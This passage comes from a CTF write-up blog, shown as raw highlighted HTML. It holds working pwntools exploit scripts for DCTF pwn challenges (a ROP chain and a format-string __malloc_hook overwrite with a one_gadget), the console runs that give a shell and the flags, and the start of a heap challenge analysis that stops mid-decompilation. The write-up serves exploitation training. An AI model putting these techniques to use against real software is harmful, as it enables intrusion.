</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x136d</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">40</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;california&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;silicon_valley&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x000000000000140b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1337c0de</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000001409</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcb760000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;loss&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Running the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="nf">python3</span> <span class="no">hotel_rop.py</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">dctf1-chall-hotel-rop.westeurope.azurecontainer.io</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">7480</span><span class="p">:</span> <span class="no">Done</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">hotel_rop</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x564fdcdc6000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">You</span> <span class="no">come</span> <span class="no">here</span> <span class="no">often</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="nf">I</span> <span class="no">think</span> <span class="no">you</span> <span class="no">should</span> <span class="no">come</span> <span class="no">here</span> <span class="no">more</span> <span class="no">often.</span>
</span></span><span class="line"><span class="cl"><span class="nf">Welcome</span> <span class="no">to</span> <span class="no">Hotel</span> <span class="no">California</span>
</span></span><span class="line"><span class="cl"><span class="nf">You</span> <span class="no">can</span> <span class="no">sign</span> <span class="no">out</span> <span class="no">anytime</span> <span class="no">you</span> <span class="no">want</span><span class="p">,</span> <span class="no">but</span> <span class="no">you</span> <span class="no">can</span> <span class="no">never</span> <span class="no">leave</span>
</span></span><span class="line"><span class="cl"><span class="nf">You</span> <span class="no">want</span> <span class="no">to</span> <span class="no">work</span> <span class="no">for</span> <span class="no">Google</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">id</span>
</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span> <span class="no">gid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span> <span class="no">groups</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="nf">dctf</span><span class="err">{</span><span class="no">ch41n_0f_h0t3ls</span><span class="err">}</span><span class="no">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span></code></pre></div><h3 id="formats-last-theorem" class="relative group">Formats last theorem <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#formats-last-theorem" aria-label="Anchor">#</a></span></h3><p>This was another format string challenge, performing the checksec on the binary we get the:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">checksec</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">checksec</span> <span class="no">for</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">formats_the_theorem</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">Canary</span>                        <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">NX</span>                            <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">PIE</span>                           <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">Fortify</span>                       <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">RelRO</span>                         <span class="p">:</span> <span class="no">Full</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>We have almost all the protections enabled, since RELRO is Full meaning we won’t be able to overwrite the GOT entries and since the challenge description hint us toward the <code>__malloc_hook</code>, we have to go the usual way to overwrite the <code>__malloc_hook</code> with the one_gadget address and call the malloc with the help of printf which will eventually call <code>__malloc_hook</code> resulting in the one_gadget being executed.</p>
<p>Reference: <a href="https://www.jaybosamiya.com/blog/2017/04/06/adv-format-string/" target="_blank" rel="noreferrer">https://www.jaybosamiya.com/blog/2017/04/06/adv-format-string/</a></p>
<p>Also, since the attachment had the docker container to hint towards LIBC, we can see that the binary was running in the Ubuntu 18.04 container which uses the LIBC 2.27ubuntu1.4 version, there was vuln function, which had format string vulnerabilty:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">vuln</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">vuln</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000073a</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000073b</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000073e</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x70</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000742</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000074b</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000074f</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000751</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x100</span><span class="p">]</span>        <span class="c1"># 0x858
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000000758</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5e0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000075d</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x70</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000761</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000764</span> <span class="err">&lt;+</span><span class="mi">42</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x136</span><span class="p">]</span>        <span class="c1"># 0x8a1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000076b</span> <span class="err">&lt;+</span><span class="mi">49</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000770</span> <span class="err">&lt;+</span><span class="mi">54</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x610</span> <span class="p">&lt;</span><span class="no">__isoc99_scanf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000775</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x12b</span><span class="p">]</span>        <span class="c1"># 0x8a7
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000077c</span> <span class="err">&lt;+</span><span class="mi">66</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5e0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000781</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x70</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000785</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000788</span> <span class="err">&lt;+</span><span class="mi">78</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000078d</span> <span class="err">&lt;+</span><span class="mi">83</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5f0</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000792</span> <span class="err">&lt;+</span><span class="mi">88</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x11a</span><span class="p">]</span>        <span class="c1"># 0x8b3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000000799</span> <span class="err">&lt;+</span><span class="mi">95</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5e0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000079e</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x10e</span><span class="p">]</span>        <span class="c1"># 0x8b3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007a5</span> <span class="err">&lt;+</span><span class="mi">107</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x5e0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007aa</span> <span class="err">&lt;+</span><span class="mi">112</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jmp</span>    <span class="mh">0x751</span> <span class="p">&lt;</span><span class="no">vuln</span><span class="p">+</span><span class="mi">23</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span></code></pre></div><p>So, in order to exploit this binary, we first needed a LIBC leak to determine the base address of LIBC so that we will be able to determine the __malloc_hook and one_gadget address. Surprisingly, one of the LIBC address at the offset of 2, which I used to get the base address of the LIBC, then using the pwntools fmtstr_payload to write 2 bytes at a time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./formats_the_theorem&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf-chall-formats-last-theorem.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7482</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%2$p&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3ed8c0</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;LIBC:  0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f432</span>
</span></span><span class="line"><span class="cl"><span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;__malloc_hook&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="n">one_gadget</span>
</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="n">malloc_hook</span>
</span></span><span class="line"><span class="cl"><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">target</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">addr</span><span class="p">:</span> <span class="n">target</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">+=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">target</span> <span class="o">&gt;&gt;=</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%66000c</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Running the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nf">python3</span> <span class="no">formats_the_theorem.py</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Opening</span> <span class="no">connection</span> <span class="no">to</span> <span class="no">dctf-chall-formats-last-theorem.westeurope.azurecontainer.io</span> <span class="no">on</span> <span class="no">port</span> <span class="mi">7482</span><span class="p">:</span> <span class="no">Done</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">libc.so.6</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nl">LIBC:</span>  <span class="err">0</span><span class="nf">x7f483a4b2000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">I</span> <span class="no">won</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">ask</span> <span class="no">you</span><span class="p">,</span> <span class="no">what</span> <span class="no">your</span> <span class="no">name</span> <span class="no">is.</span> <span class="no">It</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">getting</span> <span class="no">kinda</span> <span class="no">old</span> <span class="no">at</span> <span class="no">this</span> <span class="no">point</span>
</span></span><span class="line"><span class="cl"><span class="nf">you</span> <span class="no">entered</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">I</span> <span class="no">won</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">ask</span> <span class="no">you</span><span class="p">,</span> <span class="no">what</span> <span class="no">your</span> <span class="no">name</span> <span class="no">is.</span> <span class="no">It</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">getting</span> <span class="no">kinda</span> <span class="no">old</span> <span class="no">at</span> <span class="no">this</span> <span class="no">point</span>
</span></span><span class="line"><span class="cl"><span class="nf">you</span> <span class="no">entered</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">I</span> <span class="no">won</span><span class="err">&#39;</span><span class="no">t</span> <span class="no">ask</span> <span class="no">you</span><span class="p">,</span> <span class="no">what</span> <span class="no">your</span> <span class="no">name</span> <span class="no">is.</span> <span class="no">It</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">getting</span> <span class="no">kinda</span> <span class="no">old</span> <span class="no">at</span> <span class="no">this</span> <span class="no">point</span>
</span></span><span class="line"><span class="cl"><span class="nf">you</span> <span class="no">entered</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">id</span>
</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span> <span class="no">gid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span> <span class="no">groups</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">pilot</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">cat</span> <span class="no">flag.txt</span>
</span></span><span class="line"><span class="cl"><span class="nf">dctf</span><span class="err">{</span><span class="no">N0t_all_7h30r3ms_s0und_g00d</span><span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span></code></pre></div><h3 id="just-another-heap" class="relative group">Just another heap <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#just-another-heap" aria-label="Anchor">#</a></span></h3><p>This challenge was solved by Faith, later he shared the exploit script for the challenge, he told me:-</p>
<blockquote>
<p>it was a simple bug, malloc returned null but they didnt check for null and just added a controlled value to it(edited)
[12:51 PM]
PIE was disabled, so u can make malloc return null with a large size, then add any value to create a pointer to any memory address</p>
</blockquote>
<p>Checking the binary with the checksec:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">checksec</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">checksec</span> <span class="no">for</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">Pwning</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">just_another_heap</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nf">Canary</span>                        <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">NX</span>                            <span class="p">:</span> <span class="err">✓</span> 
</span></span><span class="line"><span class="cl"><span class="no">PIE</span>                           <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">Fortify</span>                       <span class="p">:</span> <span class="err">✘</span> 
</span></span><span class="line"><span class="cl"><span class="no">RelRO</span>                         <span class="p">:</span> <span class="no">Partial</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>The vulnerability existed in the function Create Memory:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">unsigned</span> <span class="no">__int64</span> <span class="no">create_memory</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="err">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">unsigned</span> <span class="no">__int64</span> <span class="no">v0</span><span class="c1">; // rbx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">const</span> <span class="no">char</span> <span class="p">*</span><span class="no">name</span><span class="c1">; // rbx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">important</span><span class="c1">; // [rsp+4h] [rbp-4Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">recent</span><span class="c1">; // [rsp+8h] [rbp-48h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">int</span> <span class="no">i</span><span class="c1">; // [rsp+Ch] [rbp-44h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">size_t</span> <span class="no">size</span><span class="c1">; // [rsp+10h] [rbp-40h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">size_t</span> <span class="no">offset</span><span class="c1">; // [rsp+18h] [rbp-38h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">unsigned</span> <span class="no">__int64</span> <span class="no">idx</span><span class="c1">; // [rsp+20h] [rbp-30h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">char</span> <span class="p">*</span><span class="no">chunk</span><span class="c1">; // [rsp+28h] [rbp-28h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">char</span> <span class="no">is_important</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="c1">; // [rsp+34h] [rbp-1Ch] BYREF
